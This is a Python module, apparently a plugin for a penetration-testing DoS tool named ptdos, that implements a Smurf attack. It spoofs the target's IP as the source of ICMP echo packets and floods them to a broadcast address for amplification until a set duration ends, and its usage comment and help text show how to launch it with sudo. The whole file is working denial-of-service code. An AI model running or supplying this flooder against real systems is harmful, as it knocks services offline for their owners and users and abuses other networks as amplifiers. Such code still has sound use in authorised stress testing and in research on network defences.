"""ptdos extension that adds a Smurf attack."""
# python3 ptdos.py -a smurf -d 10 -dst 192.168.0.80 -bc 192.168.0.255
# for bots in smurf need to be set net.ipv4.icmp_echo_ignore_broadcasts = 0 in /etc/sysctl.conf

# own libs
from infrastructure import factory
from misc.pt_ip import create_ip_packet
from misc.pt_socket import create_socket
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from misc.pt_icmp import create_icmp_packet
# external libs
from dataclasses import dataclass
from socket import error
from ptlibs.ptmisclib import out_if, ptprint, end_error, out_ifnot
from time import time, asctime, sleep


@dataclass
class Smurf:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        # parse additional arguments specified in make_help()
        brdct = args['broadcast']
        payload_len = args['datalength']
        packets = 0

        # Attack name, destination and duration must be specified otherwise exit
        if not brdct:
            end_error("Broadcast address must be specified.", json_no, json_obj, use_json)
            exit(1)

        # initialize icmp socket
        sock = create_socket(self.name)

        # Create a new ICMP packet of type ECHO.
        icmp = create_icmp_packet(self.name, payload_len)

        # Create a new IP packet
        ip = create_ip_packet(dst, brdct, icmp)  # spoof target system IP as source IP

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()  # stop checkservice end monitoring
                    att_end_t_asc = asctime()  # save attack's ending time
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                # do the Smurf attack
                try:
                    # Send it to the target host.
                    sock.sendto(ip.get_packet(), (brdct, 1))
                    packets += 1

                except error as serr:
                    ptprint(out_ifnot(f"Close socket due to {serr}.", "ERROR", use_json))
                    sock.close()  # close socket
                    sleep(0.25)  # wait for closing socket
                    ptprint(out_ifnot("Create new socket.", "INFO", use_json))
                    sock = create_socket(self.name)
                    ptprint(out_ifnot(f"Continue {self.name} attack with new socket.", "INFO", use_json))

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, packets)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"Smurf attack options": [
                ["NOTE: Run this DoS with sudo."],
                ["-a", "--attack", "<attack>", "Attack name - smurf"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify target system IP which will be spoofed as source IP."],
                ["-bc", "--broadcast", "<broadcast>", "Specify broadcast IP address for attack amplification."],
                ["-dl", "--data-length", "<datalength>", "Specify length of payload in bytes. Default 1024 bytes."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""
        parser.add_argument("-bc", "--broadcast", dest="broadcast", type=str)  # broadcast IP


def register() -> None:
    """Register attack in factory."""
    factory.register("smurf", Smurf)
